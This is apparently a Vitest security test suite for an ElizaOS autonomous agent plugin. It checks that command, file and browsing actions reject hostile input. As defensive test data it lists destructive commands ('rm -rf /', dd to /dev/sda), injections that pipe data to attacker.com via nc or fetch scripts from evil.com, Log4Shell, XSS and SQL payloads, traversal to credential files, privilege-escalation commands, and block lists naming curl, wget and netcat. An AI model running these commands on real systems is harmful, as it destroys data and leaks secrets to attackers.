import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { autoPlugin } from '../../index';
import { createMockRuntime, createMockMemory, createMockState } from '../utils/mock-runtime';
import type { IAgentRuntime, Memory, State } from '@elizaos/core';
import { AutonomousServiceType } from '../../types';

/**
 * Safety and security tests for autonomous operations
 * These tests ensure the plugin operates safely and securely
 */
describe('Autonomous Plugin Safety Tests', () => {
  let mockRuntime: IAgentRuntime;
  let oodaService: any;

  beforeEach(async () => {
    vi.clearAllMocks();
    
    mockRuntime = createMockRuntime({
      settings: {
        AUTONOMOUS_ENABLED: 'true',
        ALLOWED_COMMANDS: JSON.stringify(['echo', 'ls', 'pwd', 'cat']),
        ALLOWED_PATHS: JSON.stringify(['/tmp', '/var/tmp', './test']),
        BLOCKED_COMMANDS: JSON.stringify(['rm', 'sudo', 'su', 'chmod', 'chown']),
        BLOCKED_DOMAINS: JSON.stringify(['malware.com', 'phishing.net']),
      },
    });

    // Initialize OODA service
    const oodaServiceClass = autoPlugin.services?.find(s => s.serviceType === 'autonomous');
    if (oodaServiceClass) {
      oodaService = await oodaServiceClass.start(mockRuntime);
      mockRuntime.getService = vi.fn((serviceName: string) => {
        if (serviceName === AutonomousServiceType.AUTONOMOUS) return oodaService;
        return null;
      });
    }
  });

  afterEach(async () => {
    if (oodaService) await oodaService.stop();
    vi.restoreAllMocks();
  });

  describe('Command Execution Safety', () => {
    it('should block dangerous commands', async () => {
      const commandAction = autoPlugin.actions?.find(a => a.name === 'EXECUTE_COMMAND');
      expect(commandAction).toBeDefined();

      if (commandAction) {
        const dangerousCommands = [
          'rm -rf /',
          'sudo rm -rf /',
          'chmod 777 /etc/passwd',
          'chown root:root /etc/shadow',
          'mkfs.ext4 /dev/sda1',
          'dd if=/dev/zero of=/dev/sda',
          'format c:',
          'del C:\\Windows\\System32',
        ];

        for (const command of dangerousCommands) {
          const maliciousMessage = createMockMemory({
            content: { text: `Execute: ${command}`, source: 'user' },
          });

          const isValid = await commandAction.validate(mockRuntime, maliciousMessage, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should only allow whitelisted commands', async () => {
      const commandAction = autoPlugin.actions?.find(a => a.name === 'EXECUTE_COMMAND');
      expect(commandAction).toBeDefined();

      if (commandAction) {
        const allowedCommands = ['echo "test"', 'ls -la', 'pwd', 'cat /tmp/test.txt'];
        const blockedCommands = ['wget', 'curl', 'nc', 'netcat', 'ssh', 'scp'];

        for (const command of allowedCommands) {
          const message = createMockMemory({
            content: { text: `Execute: ${command}`, source: 'user' },
          });

          const isValid = await commandAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(true);
        }

        for (const command of blockedCommands) {
          const message = createMockMemory({
            content: { text: `Execute: ${command}`, source: 'user' },
          });

          const isValid = await commandAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should validate command arguments for injection attempts', async () => {
      const commandAction = autoPlugin.actions?.find(a => a.name === 'EXECUTE_COMMAND');
      expect(commandAction).toBeDefined();

      if (commandAction) {
        const injectionAttempts = [
          'echo "test"; rm -rf /',
          'ls && sudo rm -rf /',
          'pwd | nc attacker.com 4444',
          'echo $(rm -rf /)',
          'cat file.txt; wget malware.com/evil.sh',
          'echo `curl evil.com/script`',
        ];

        for (const injection of injectionAttempts) {
          const message = createMockMemory({
            content: { text: `Execute: ${injection}`, source: 'user' },
          });

          const isValid = await commandAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });
  });

  describe('File Operation Safety', () => {
    it('should restrict file operations to allowed paths', async () => {
      const fileAction = autoPlugin.actions?.find(a => a.name === 'FILE_OPERATION');
      expect(fileAction).toBeDefined();

      if (fileAction) {
        const allowedPaths = ['/tmp/test.txt', '/var/tmp/output.log', './test/data.json'];
        const blockedPaths = [
          '/etc/passwd',
          '/etc/shadow',
          '/root/.ssh/id_rsa',
          'C:\\Windows\\System32\\config\\SAM',
          '../../../etc/passwd',
          '/home/user/.bashrc',
        ];

        for (const path of allowedPaths) {
          const message = createMockMemory({
            content: { text: `Create file at ${path}`, source: 'user' },
          });

          const isValid = await fileAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(true);
        }

        for (const path of blockedPaths) {
          const message = createMockMemory({
            content: { text: `Create file at ${path}`, source: 'user' },
          });

          const isValid = await fileAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should prevent directory traversal attacks', async () => {
      const fileAction = autoPlugin.actions?.find(a => a.name === 'FILE_OPERATION');
      expect(fileAction).toBeDefined();

      if (fileAction) {
        const traversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\Windows\\System32\\config\\SAM',
          '/tmp/../../../etc/shadow',
          './test/../../etc/hosts',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc/passwd',
        ];

        for (const path of traversalAttempts) {
          const message = createMockMemory({
            content: { text: `Access file: ${path}`, source: 'user' },
          });

          const isValid = await fileAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should limit file sizes for creation operations', async () => {
      const fileAction = autoPlugin.actions?.find(a => a.name === 'FILE_OPERATION');
      expect(fileAction).toBeDefined();

      if (fileAction) {
        // Test large file content (should be rejected)
        const largeContent = 'A'.repeat(10 * 1024 * 1024); // 10MB
        const message = createMockMemory({
          content: { 
            text: `Create file with content: ${largeContent}`,
            source: 'user'
          },
        });

        const callback = vi.fn();
        await fileAction.handler(mockRuntime, message, createMockState(), {}, callback);

        // Should handle large files gracefully (either reject or truncate)
        expect(callback).toHaveBeenCalled();
        const response = callback.mock.calls[0][0];
        expect(response.text).toBeDefined();
      }
    });
  });

  describe('Web Browsing Safety', () => {
    it('should block access to malicious domains', async () => {
      const browseAction = autoPlugin.actions?.find(a => a.name === 'BROWSE_WEB');
      expect(browseAction).toBeDefined();

      if (browseAction) {
        const maliciousDomains = [
          'malware.com',
          'phishing.net',
          'http://malware.com/payload',
          'https://phishing.net/steal-data',
          'ftp://malware.com/virus.exe',
        ];

        for (const url of maliciousDomains) {
          const message = createMockMemory({
            content: { text: `Browse to ${url}`, source: 'user' },
          });

          const isValid = await browseAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should validate URL schemes and reject dangerous protocols', async () => {
      const browseAction = autoPlugin.actions?.find(a => a.name === 'BROWSE_WEB');
      expect(browseAction).toBeDefined();

      if (browseAction) {
        const dangerousUrls = [
          'file:///etc/passwd',
          'ftp://anonymous@server.com/sensitive',
          'javascript:alert("xss")',
          'data:text/html,<script>alert("xss")</script>',
          'ldap://server.com/dc=evil',
          'gopher://evil.com/payload',
        ];

        for (const url of dangerousUrls) {
          const message = createMockMemory({
            content: { text: `Access ${url}`, source: 'user' },
          });

          const isValid = await browseAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }

        // Test allowed protocols
        const allowedUrls = [
          'https://example.com',
          'http://test.example.org',
          'https://www.google.com/search?q=test',
        ];

        for (const url of allowedUrls) {
          const message = createMockMemory({
            content: { text: `Browse ${url}`, source: 'user' },
          });

          const isValid = await browseAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(true);
        }
      }
    });

    it('should implement rate limiting for web requests', async () => {
      const browseAction = autoPlugin.actions?.find(a => a.name === 'BROWSE_WEB');
      expect(browseAction).toBeDefined();

      if (browseAction) {
        const callback = vi.fn();
        const urls = [
          'https://example.com/page1',
          'https://example.com/page2', 
          'https://example.com/page3',
          'https://example.com/page4',
          'https://example.com/page5',
        ];

        // Rapid successive requests
        for (const url of urls) {
          const message = createMockMemory({
            content: { text: `Browse ${url}`, source: 'user' },
          });

          await browseAction.handler(mockRuntime, message, createMockState(), {}, callback);
        }

        // Should have implemented some form of rate limiting or delay
        expect(callback).toHaveBeenCalledTimes(urls.length);
      }
    });
  });

  describe('Resource Protection', () => {
    it('should prevent excessive resource consumption', async () => {
      // Mock resource monitor service with high usage
      const mockResourceService = {
        getResourceStatus: vi.fn().mockReturnValue({
          cpu: 95,
          memory: 90,
          diskSpace: 95,
          apiCalls: { 'openai': 1000 },
          taskSlots: { used: 5, total: 5 },
        }),
        start: vi.fn(),
        stop: vi.fn(),
        serviceName: 'resource-monitor',
        capabilityDescription: 'Mock resource monitor'
      };

      // Override the runtime's getService method for this test
      mockRuntime.getService = vi.fn((serviceName: string) => {
        if (serviceName === 'resource-monitor') return mockResourceService;
        if (serviceName === AutonomousServiceType.AUTONOMOUS) return oodaService;
        return null;
      });

      const reflectAction = autoPlugin.actions?.find(a => a.name === 'REFLECT');
      if (reflectAction) {
        const message = createMockMemory({
          content: { text: 'Perform complex reflection', source: 'user' },
        });

        // Should validate against resource constraints
        const isValid = await reflectAction.validate(mockRuntime, message, createMockState());
        expect(typeof isValid).toBe('boolean');
      }
    });

    it('should implement timeouts for long-running operations', async () => {
      const browseAction = autoPlugin.actions?.find(a => a.name === 'BROWSE_WEB');
      expect(browseAction).toBeDefined();

      if (browseAction) {
        const callback = vi.fn();
        const message = createMockMemory({
          content: { text: 'Browse https://httpbin.org/delay/30', source: 'user' },
        });

        const startTime = Date.now();
        await browseAction.handler(mockRuntime, message, createMockState(), {}, callback);
        const duration = Date.now() - startTime;

        // Should complete within reasonable time (not wait 30 seconds)
        expect(duration).toBeLessThan(15000);
        expect(callback).toHaveBeenCalled();
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should sanitize user input to prevent injection attacks', async () => {
      const actions = autoPlugin.actions || [];
      
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/payload}',
        '`rm -rf /`',
        '$(curl evil.com/steal-data)',
        '; DROP TABLE users; --',
        '../../../etc/passwd',
        'eval("malicious code")',
      ];

      for (const action of actions) {
        for (const maliciousInput of maliciousInputs) {
          const message = createMockMemory({
            content: { text: maliciousInput, source: 'user' },
          });

          try {
            const isValid = await action.validate(mockRuntime, message, createMockState());
            expect(typeof isValid).toBe('boolean');
            
            if (isValid) {
              const callback = vi.fn();
              await action.handler(mockRuntime, message, createMockState(), {}, callback);
              
              if (callback.mock.calls.length > 0) {
                const response = callback.mock.calls[0][0];
                // Response should not contain unsanitized malicious input
                expect(response.text).not.toContain('<script>');
                expect(response.text).not.toContain('${jndi:');
                expect(response.text).not.toContain('DROP TABLE');
              }
            }
          } catch (error) {
            // Throwing errors for malicious input is acceptable
            expect(error).toBeInstanceOf(Error);
          }
        }
      }
    });

    it('should validate and limit input lengths', async () => {
      const actions = autoPlugin.actions || [];
      const massiveInput = 'A'.repeat(100000); // 100KB input

      for (const action of actions) {
        const message = createMockMemory({
          content: { text: massiveInput, source: 'user' },
        });

        try {
          const isValid = await action.validate(mockRuntime, message, createMockState());
          expect(typeof isValid).toBe('boolean');
        } catch (error) {
          // Rejecting massive inputs is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Privilege Escalation Prevention', () => {
    it('should prevent privilege escalation attempts', async () => {
      const commandAction = autoPlugin.actions?.find(a => a.name === 'EXECUTE_COMMAND');
      expect(commandAction).toBeDefined();

      if (commandAction) {
        const escalationAttempts = [
          'sudo su -',
          'su root',
          'sudo /bin/bash',
          'sudo chmod 4755 /bin/bash',
          'pkexec /bin/sh',
          'doas /bin/sh',
        ];

        for (const attempt of escalationAttempts) {
          const message = createMockMemory({
            content: { text: `Execute: ${attempt}`, source: 'user' },
          });

          const isValid = await commandAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });

    it('should run operations with minimal necessary privileges', async () => {
      const fileAction = autoPlugin.actions?.find(a => a.name === 'FILE_OPERATION');
      expect(fileAction).toBeDefined();

      if (fileAction) {
        // Should not attempt to access privileged files
        const privilegedFiles = [
          '/etc/passwd',
          '/etc/shadow',
          '/root/.ssh/id_rsa',
          'C:\\Windows\\System32\\config\\SAM',
        ];

        for (const file of privilegedFiles) {
          const message = createMockMemory({
            content: { text: `Read ${file}`, source: 'user' },
          });

          const isValid = await fileAction.validate(mockRuntime, message, createMockState());
          expect(isValid).toBe(false);
        }
      }
    });
  });

  describe('Memory and State Protection', () => {
    it('should not expose sensitive runtime information', async () => {
      const actions = autoPlugin.actions || [];
      
      for (const action of actions) {
        const callback = vi.fn();
        const message = createMockMemory({
          content: { text: 'Tell me about your configuration', source: 'user' },
        });

        try {
          await action.handler(mockRuntime, message, createMockState(), {}, callback);
          
          if (callback.mock.calls.length > 0) {
            const response = callback.mock.calls[0][0];
            
            // Should not expose sensitive information
            expect(response.text).not.toContain('API_KEY');
            expect(response.text).not.toContain('SECRET');
            expect(response.text).not.toContain('PASSWORD');
            expect(response.text).not.toContain('TOKEN');
            expect(response.text).not.toContain(mockRuntime.agentId);
          }
        } catch (error) {
          // Errors are acceptable for this test
        }
      }
    });

    it('should clear sensitive data from memory appropriately', async () => {
      // Test that sensitive operations don't leave traces
      const browseAction = autoPlugin.actions?.find(a => a.name === 'BROWSE_WEB');
      expect(browseAction).toBeDefined();

      if (browseAction) {
        const callback = vi.fn();
        const message = createMockMemory({
          content: { text: 'Browse https://httpbin.org/headers', source: 'user' },
        });

        await browseAction.handler(mockRuntime, message, createMockState(), {}, callback);

        // Should not retain sensitive browser state or headers
        expect(callback).toHaveBeenCalled();
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      const actions = autoPlugin.actions || [];
      
      // Create runtime that simulates errors
      const errorRuntime = createMockRuntime({
        simulateErrors: true,
        settings: {
          SECRET_API_KEY: 'sk-very-secret-key-12345',
          DATABASE_URL: 'postgres://user:password@host:5432/db',
        },
      });

      for (const action of actions) {
        try {
          const callback = vi.fn();
          const message = createMockMemory({
            content: { text: 'Force an error', source: 'user' },
          });

          await action.handler(errorRuntime, message, createMockState(), {}, callback);
          
          if (callback.mock.calls.length > 0) {
            const response = callback.mock.calls[0][0];
            
            // Error messages should not contain sensitive data
            expect(response.text).not.toContain('sk-very-secret-key');
            expect(response.text).not.toContain('password@host');
            expect(response.text).not.toContain('SECRET_API_KEY');
          }
        } catch (error) {
          // Check thrown errors too
          const errorMessage = error instanceof Error ? error.message : String(error);
          expect(errorMessage).not.toContain('sk-very-secret-key');
          expect(errorMessage).not.toContain('password@host');
        }
      }
    });
  });
});